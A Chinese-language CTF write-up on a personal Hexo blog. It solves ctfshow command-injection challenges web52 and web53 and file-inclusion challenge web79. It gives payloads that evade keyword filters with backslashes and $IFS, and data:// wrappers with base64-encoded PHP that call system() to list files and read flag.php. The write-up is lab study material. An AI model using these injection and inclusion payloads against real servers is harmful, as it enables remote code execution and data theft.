@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>ctfshow 命令执行web52 | l-y-fのblog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="题目来源：ctfshow 命令执行web52题目链接(https:&#x2F;&#x2F;b83d7aae-37e0-4319-bc65-1d82018700c8.challenge.ctf.show&#x2F;)解题思路：启动靶机正则过滤了分号 cat flag 空格 所有数字 $ * more less head sort tail sed cut tac awk strings od curl 反引号 % Tab键 &amp;a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow 命令执行web52">
+<meta property="og:url" content="https://l-y-f-f1111.github.io/2026/08/11/2026-08-11-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb52/index.html">
+<meta property="og:site_name" content="l-y-fのblog">
+<meta property="og:description" content="题目来源：ctfshow 命令执行web52题目链接(https:&#x2F;&#x2F;b83d7aae-37e0-4319-bc65-1d82018700c8.challenge.ctf.show&#x2F;)解题思路：启动靶机正则过滤了分号 cat flag 空格 所有数字 $ * more less head sort tail sed cut tac awk strings od curl 反引号 % Tab键 &amp;a">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260810183116.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260810184031.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260810184130.png%7C697">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260810185226.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260810185825.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260810191320.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260810191425.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260811190501.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260811192103.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260811191814.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260811192036.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260811192149.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260811194959.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260811192645.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260811193349.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260811195649.png">
+<meta property="article:published_time" content="2026-08-11T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-12T08:46:58.177Z">
+<meta property="article:author" content="l-y-f">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260810183116.png">
+  
+    <link rel="alternate" href="/atom.xml" title="l-y-fのblog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">l-y-fのblog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://l-y-f-f1111.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-2026-08-11-ctfshow 命令执行web52" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/08/11/2026-08-11-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb52/" class="article-date">
+  <time class="dt-published" datetime="2026-08-11T00:00:00.000Z" itemprop="datePublished">2026-08-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      ctfshow 命令执行web52
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>题目来源：ctfshow 命令执行web52<br>题目链接(<a target="_blank" rel="noopener" href="https://b83d7aae-37e0-4319-bc65-1d82018700c8.challenge.ctf.show/">https://b83d7aae-37e0-4319-bc65-1d82018700c8.challenge.ctf.show/</a>)<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260810183116.png"><br>正则过滤了分号 cat flag 空格 所有数字 <code>$</code> <code>*</code> more less head sort tail sed cut tac awk strings od curl 反引号 <code>%</code> Tab键 <code>&amp;</code> <code>&lt;</code> <code>&gt;</code>且不区分大小写<br>重定向被禁 换用<br><code>?c=ta\c$IFSfla\g.php||</code><br><img src="/images/Pastedimage20260810184031.png"><br>得不到flag 原因是：shell解析过程中变量名是 <code>$IFSfla</code>，而不是 <code>$IFS</code>,Shell 会查找名为 <code>IFSfla</code> 的变量，但这个变量不存在 <code>$IFSfla</code> 被替换为空字符串<br>（一般情况下是<code>$IFS$9</code> <code>$9</code>作为边界，但是这里<code>$</code>和9都被禁止了所以用反斜杠<code>\</code>)</p>
+<p>payload:<code>?c=ta\c$IFS\fla\g.php||</code><br>反斜杠可以做边界的原因：在Shell中，变量名由字母、数字、下划线组成 这里的反斜杠不符合该要求，所以区分开了变量名<br><img src="/images/Pastedimage20260810184130.png%7C697"><br>提示flag不在该文件中 真正的flag可能在：根目录下的文件<br>payload:<code>?c=ta\c$IFS\/fla\g||</code><br><img src="/images/Pastedimage20260810185226.png"><br>得到flag</p>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>题目来源：ctfshow 命令执行web53<br>题目链接(<a target="_blank" rel="noopener" href="https://52fb4478-1f2e-45c3-90f7-ab16360b6cef.challenge.ctf.show/">https://52fb4478-1f2e-45c3-90f7-ab16360b6cef.challenge.ctf.show/</a>)<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260810185825.png"><br>正则过滤了分号 cat flag 空格 所有数字  <code>*</code> more less head sort tail sed cut tac awk strings od curl 反引号 <code>%</code> Tab键 <code>&amp;</code> <code>&lt;</code> <code>&gt;</code>且不区分大小写<br>如果通过正则检测，执行系统命令 <code>$c</code>，并将命令的最后一行输出赋值给变量 <code>$d</code><br>输出一个HTML换行标签 <code>&lt;br&gt;</code>，然后输出 <code>$d</code> 的值<br>总体实现了：命令输出直接显示在浏览器，额外显示命令的最后一行，且没有重定向，可以省去命令分割<br>用上一题的绕过空格的方法<br>payload:<code>?c=ta\c$IFS\fla\g.php</code><br><img src="/images/Pastedimage20260810191320.png"><br>得到flag</p>
+<p>还有另外一种格式：<br>由于此题<code>$</code>没有被禁，所以空格可以用<code>$&#123;IFS&#125;</code>代替，这个格式直接确定好了边界，无需再加反斜杠<br><code>?c=ta\c$&#123;IFS&#125;fla?.php</code><br><img src="/images/Pastedimage20260810191425.png"><br>得到flag</p>
+<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>题目来源：ctfshow 文件包含web79<br>题目链接(<a target="_blank" rel="noopener" href="https://f73c96f3-2aa6-4f22-bd63-1153f9fb8e5e.challenge.ctf.show/">https://f73c96f3-2aa6-4f22-bd63-1153f9fb8e5e.challenge.ctf.show/</a>)<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260811190501.png"><br>GET传参赋值给参数<code>file</code><br><code>$file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</code><br>第1个参数：要查找的字符串 <code>&quot;php&quot;</code><br>第2个参数：替换成的内容 <code>&quot;???&quot;</code><br>第3个参数：目标字符串 <code>$file</code><br>执行过程：查找<code>$file</code>中所有出现的<code>&quot;php&quot;</code>，替换为<code>&quot;???&quot;</code><br><code>include()</code>：PHP的文件包含函数，将指定文件的内容作为PHP代码执行<br>和上一题一样用data协议查看文件目录 但是为了避免<code>php</code>触发替换字符的命令 要对包含PHP代码的完整语句进行Base64编码<br>Base64编码后的字符串不包含连续的”php” <code>str_replace</code>无法匹配到”php”<br>数据在解码后才是PHP代码，<code>str_replace</code>发生在include之前，替换时处理的是编码后的字符串，解码在include内部进行<br>总结绕过原理：<strong>str_replace先执行，include后执行 并且include时才解码</strong><br><img src="/images/Pastedimage20260811192103.png"><br>payload:<code>/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw==</code><br><img src="/images/Pastedimage20260811191814.png"></p>
+<p>查看flag.php文件内容<br><img src="/images/Pastedimage20260811192036.png"><br><code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</code><br><img src="/images/Pastedimage20260811192149.png"><br>查看源码拿到flag<br><img src="/images/Pastedimage20260811194959.png"></p>
+<p>查看wp后发现可以直接通过大小写绕过<br>我根据这个思路 用了上一题的payload把php进行了大小写修改<br>payload:<code>?file=Php://filter/read=convert.base64-encode/resource=flag.Php</code><br>得不到flag<br><img src="/images/Pastedimage20260811192645.png"><br>原因：<strong>协议名称在流包装器注册表中是区分大小写的</strong><br>所以不能用<code>php://filter</code><br>改为使用<code>data://</code> +大小写绕过<br><code>?file=data://text/plain,&lt;?Php system(&#39;tac fla*&#39;);?&gt;</code><br><img src="/images/Pastedimage20260811193349.png"><br>得到flag</p>
+<p>这里我发现了昨天那道文件包含题的问题，昨天做的时候查看源码没有响应，我今天又试了一下发现可以拿到flag<br><code>?file=data://text/plain,&lt;?php system(&#39;cat flag.php&#39;);</code><br>查看源码同样可以得到flag<br><img src="/images/Pastedimage20260811195649.png"><br>这个payload是在执行命令，而不是在读取文件内容<br>1.PHP接收到请求<br>2.PHP解析data:&#x2F;&#x2F;协议<br>3.PHP执行包含的代码<br>&#x2F;&#x2F; 执行流程：<br>&#x2F;&#x2F; 1. 解析 <code>&lt;?php ... ?&gt; </code>标签<br>&#x2F;&#x2F; 2. 执行 <code>system(&#39;cat flag.php&#39;)</code><br>&#x2F;&#x2F; 3. 返回命令结果<br>4.系统命令cat在服务器端的Shell中执行 system() 函数执行的内容cat flag.php</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://l-y-f-f1111.github.io/2026/08/11/2026-08-11-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb52/" data-id="cmspupgt600091cuyd6gz9xoc" data-title="ctfshow 命令执行web52" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2026/08/12/hello-world/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          Hello World
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2026/08/10/2026-08-10-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb50/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">ctfshow 命令执行web50</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/08/">八月 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/07/">七月 2026</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2026/08/12/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2026/08/11/2026-08-11-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb52/">ctfshow 命令执行web52</a>
+          </li>
+        
+          <li>
+            <a href="/2026/08/10/2026-08-10-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb50/">ctfshow 命令执行web50</a>
+          </li>
+        
+          <li>
+            <a href="/2026/08/09/2026-08-09-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb47/">ctfshow 命令执行web47</a>
+          </li>
+        
+          <li>
+            <a href="/2026/08/07/2026-08-07-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb44/">ctfshow 命令执行web44</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 l-y-f<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
